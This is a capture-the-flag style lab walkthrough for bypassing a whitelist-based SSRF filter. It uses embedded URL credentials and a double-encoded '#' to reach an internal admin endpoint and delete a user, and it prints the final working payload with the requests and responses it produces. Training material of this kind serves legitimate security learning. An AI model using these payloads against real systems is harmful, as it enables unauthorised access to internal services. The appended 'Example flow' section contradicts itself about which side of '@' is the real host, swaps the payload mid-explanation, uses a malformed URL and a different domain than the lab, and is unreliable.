================================================================================
       LAB: SSRF with Whitelist-Based Input Filter (Bypass)
================================================================================

Objective
---------
Access the internal admin interface:

    http://localhost/admin

Then delete the user:

    carlos

The application validates the hostname against a whitelist.
Your goal is to bypass this validation.

================================================================================
STEP 1 - Visit Product Page
================================================================================

          +--------------------------------------+
          |          Product Web Page            |
          |                                      |
          |     [ Check Stock ]  <-- Click       |
          +--------------------------------------+
                        |
                        |
                        V

================================================================================
STEP 2 - Capture Request in Burp Suite
================================================================================

Browser
   |
   V
+-------------------+
| Burp Proxy        |
| Intercept ON      |
+-------------------+
          |
          V

Captured Request

GET /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check


          |
          |
          V

Right Click
      |
      +----> Send to Repeater

================================================================================
STEP 3 - Test Localhost Access
================================================================================

Replace

http://stock.weliketoshop.net


With

http://127.0.0.1/


                    |
                    |
                    V

Send Request

Response

❌ Rejected

Observation

The application extracts the hostname
and checks it against a whitelist.

================================================================================
STEP 4 - Test Embedded Credentials
================================================================================

Replace URL with

http://username@stock.weliketoshop.net/


Structure

        username
            |
            V
http://username@stock.weliketoshop.net/
               ^
               |
        Actual Hostname


Send Request

Response

✔ Accepted

Observation

The URL parser supports embedded credentials.

================================================================================
STEP 5 - Test Fragment Character (#)
================================================================================

Modify URL

http://#username@stock.weliketoshop.net/


Send Request

Response

❌ Rejected

Observation

The "#" character is filtered.

================================================================================
STEP 6 - Double URL Encode '#'
================================================================================

Encode

#

↓

%23

Encode Again

%23

↓

%2523


New URL

http://%2523username@stock.weliketoshop.net/


Send Request

Response

HTTP 500 Internal Server Error

Observation

The backend appears to decode the value
again before processing.

This suggests a double-decoding vulnerability.

================================================================================
STEP 7 - Craft Final SSRF Payload
================================================================================

Final Payload

http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos


Visual Breakdown

http://localhost:80%2523@stock.weliketoshop.net
       |          |                  |
       |          |                  |
       |          |                  +---- Trusted hostname
       |          |
       |          +----------------------- Double encoded '#'
       |
       +------------------------------ Actual target


After backend decoding

http://localhost:80#@stock.weliketoshop.net/admin/delete?username=carlos


Meaning

URL Validator Sees

stock.weliketoshop.net

✔ Allowed


Backend Connection Uses

localhost

✔ Internal Admin Interface

================================================================================
STEP 8 - Send Final Request
================================================================================

Click

Send

          |
          |
          V

Server connects to

localhost/admin/delete?username=carlos

          |
          |
          V

User

carlos

Deleted

================================================================================
COMPLETE ATTACK FLOW
================================================================================

                 User
                   |
                   V
          Open Product Page
                   |
                   V
          Click Check Stock
                   |
                   V
          Burp Proxy Capture
                   |
                   V
         Send to Repeater
                   |
                   V
       Test 127.0.0.1
                   |
             Rejected
                   |
                   V
   Test Embedded Credentials
                   |
     username@stock.weliketoshop.net
                   |
             Accepted
                   |
                   V
        Test '#' Character
                   |
             Rejected
                   |
                   V
     Double Encode '#'
          (# → %23 → %2523)
                   |
                   V
      Craft Final Payload

http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

                   |
                   V
             Send Request
                   |
                   V
     localhost/admin/delete
                   |
                   V
      ✔ User "carlos" Deleted
                   |
                   V
            ✔ Lab Solved

================================================================================
URL ENCODING REFERENCE
================================================================================

Character      Encoded Once      Encoded Twice
------------------------------------------------
#              %23               %2523
@              %40               %2540
:              %3A               %253A
/              %2F               %252F

================================================================================
```

## Example flow :

```text
================================================================================
             THE FLOW: SSRF WITH WHITELIST-BASED INPUT FILTER
================================================================================

 [ YOU ]
    │
    │ 1. You want to hit the secret internal machine, but the filter requires
    │    the string "://welcometoshop.com" to be present.
    │    So you use a URL parsing trick with the '@' symbol.
    │    Payload: "http://internal-machine.local@://welcometoshop.com"
    │             (In URL logic, everything before '@' is credentials, 
    │              and the machine actually visits what comes AFTER '@')
    ▼
 [ SECURITY GUARD / WHITELIST FILTER ]
    │
    │ 2. Scans your text to see if the approved domain is present:
    │    Does it contain "://welcometoshop.com"? -> YES.
    │    Decision: "It's on the VIP list. Let it pass!"
    ▼
 [ PUBLIC WEB APP (URL Parser Parser Glitch) ]
    │
    │ 3. The Web App's network library reads the URL differently than the guard.
    │    It reads: http://[username]@[actual_destination]
    │    Wait! Let's swap the positioning:
    │    Payload: "http://://welcometoshop.com@internal-machine.local"
    │    The parser thinks "://welcometoshop.com" is just a username,
    │    and it extracts "internal-machine.local" as the real destination!
    │
    │ 4. The Web App blindly connects to the parsed destination.
    ▼
 [ INTERNAL SERVICE ]
    │
    │ 5. Receives the connection request forwarded by the Web App.
    │    The strict whitelist filter was successfully bypassed!
```